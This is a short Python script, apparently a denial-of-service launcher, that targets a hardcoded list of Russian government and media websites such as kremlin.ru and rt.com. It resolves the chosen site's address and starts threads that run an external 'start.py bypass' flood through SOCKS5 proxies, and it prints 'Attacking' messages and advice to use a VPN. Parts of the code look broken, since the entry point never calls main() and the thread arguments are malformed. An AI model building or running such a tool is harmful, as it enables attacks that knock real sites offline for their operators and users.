import os
import subprocess
import shlex
import threading
import time
import dns.resolver
import random
from colorama import init, Fore, Back
from pprint import pprint

init()
os.path.join(os.path.dirname(__file__))


RUNNING = False
OptionList = [
    "www.rt.com",
    "www.cbr.ru",
    "www.kremlin.ru",
    "www.vesti.ru",
    "www.smotrim.ru",
    "www.vgtrk.ru",
]
host = OptionList[0]

threads = []
proc = None



def stop():
    global RUNNING
    RUNNING = False
    if proc:
        print(Fore.RED + "Stopping..")
        proc.terminate()
        proc.kill()
    for thread in threads:
        thread.join()


def get_ip(host):
    resolver = dns.resolver.Resolver()
    ips = list(resolver.query(host, 'A'))
    ip = random.choice(ips)
    return ip.to_text()




def start(thread_number: str):
    hostText = host
    print(Fore.GREEN + f"Getting IP for {hostText} thread : {thread_number}")
    time.sleep(2)
    ip = get_ip(hostText)
    print(Fore.RED + f"Attacking {hostText} ({ip})")
    cmd = f'python start.py bypass {hostText} 5 1000 socks5.txt 100 100'
    proc = subprocess.Popen(shlex.split(cmd))
    
    



def main():
    thread_numbers = 0
    while True:
        try:
            print(Fore.YELLOW + Back.BLACK + 'Advice - leave some resources to stop that shit')
            thread_numbers = int(
                input("Please input amount of threads you want to share (int value): "))
        except ValueError:
            print(Fore.RED + "Please input a number")
        else:
            break
    pprint(OptionList)
    print(Fore.YELLOW + "Choose one of this list starts from 0")
    host_number = int(
        input("Plesae input amount of threads you want to share (0-5): "))
    global host
    host = OptionList[host_number]
    threads = [threading.Thread(target=start, args=(str(_))) for _ in range(thread_numbers)]
    global RUNNING
    RUNNING = True
    for thread in threads:
        thread.start()

if __name__ == '__main__':
    print(Fore.GREEN + "Welcome")
    print(Fore.YELLOW + "Better use vpn before running this app")
    print(Fore.RED + "TO EXIT KILL THIS TAB!!!")
